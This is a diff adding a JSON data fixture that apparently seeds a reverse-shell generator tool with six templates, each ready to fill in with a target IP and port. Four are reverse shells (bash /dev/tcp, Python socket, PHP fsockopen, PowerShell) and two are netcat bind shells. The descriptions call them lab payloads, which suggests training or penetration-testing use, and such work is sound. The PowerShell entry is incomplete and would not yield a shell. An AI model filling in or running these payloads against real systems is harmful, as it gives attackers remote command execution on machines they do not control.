@@ -1,0 +1,93 @@
+[
+  {
+    "model": "shells.shelltemplate",
+    "pk": 1,
+    "fields": {
+      "name": "Bash Reverse TCP",
+      "shell_type": "reverse",
+      "language": "bash",
+      "os": "linux",
+      "description": "Classic bash reverse shell for Linux labs.",
+      "template": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
+      "tags": "bash,reverse,tcp",
+      "difficulty": "beginner",
+      "is_active": true
+    }
+  },
+  {
+    "model": "shells.shelltemplate",
+    "pk": 2,
+    "fields": {
+      "name": "Python Reverse Socket",
+      "shell_type": "reverse",
+      "language": "python",
+      "os": "linux",
+      "description": "Python reverse shell one-liner.",
+      "template": "python3 -c 'import os,socket,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'",
+      "tags": "python,reverse,socket",
+      "difficulty": "intermediate",
+      "is_active": true
+    }
+  },
+  {
+    "model": "shells.shelltemplate",
+    "pk": 3,
+    "fields": {
+      "name": "PHP Reverse Shell",
+      "shell_type": "reverse",
+      "language": "php",
+      "os": "linux",
+      "description": "PHP reverse shell using fsockopen.",
+      "template": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+      "tags": "php,reverse",
+      "difficulty": "intermediate",
+      "is_active": true
+    }
+  },
+  {
+    "model": "shells.shelltemplate",
+    "pk": 4,
+    "fields": {
+      "name": "PowerShell Reverse TCP",
+      "shell_type": "reverse",
+      "language": "powershell",
+      "os": "windows",
+      "description": "PowerShell reverse shell for Windows labs.",
+      "template": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});",
+      "tags": "powershell,reverse,windows",
+      "difficulty": "advanced",
+      "is_active": true
+    }
+  },
+  {
+    "model": "shells.shelltemplate",
+    "pk": 5,
+    "fields": {
+      "name": "Netcat Bind Shell",
+      "shell_type": "bind",
+      "language": "netcat",
+      "os": "linux",
+      "description": "Bind shell with netcat variant supporting -e.",
+      "template": "nc -lvnp {port} -e /bin/sh",
+      "tags": "netcat,bind",
+      "difficulty": "beginner",
+      "is_active": true
+    }
+  },
+  {
+    "model": "shells.shelltemplate",
+    "pk": 6,
+    "fields": {
+      "name": "Bash Bind Shell",
+      "shell_type": "bind",
+      "language": "bash",
+      "os": "linux",
+      "description": "Named pipe bash bind shell pattern.",
+      "template": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp {port} >/tmp/f",
+      "tags": "bash,bind",
+      "difficulty": "advanced",
+      "is_active": true
+    }
+  }
+]
+
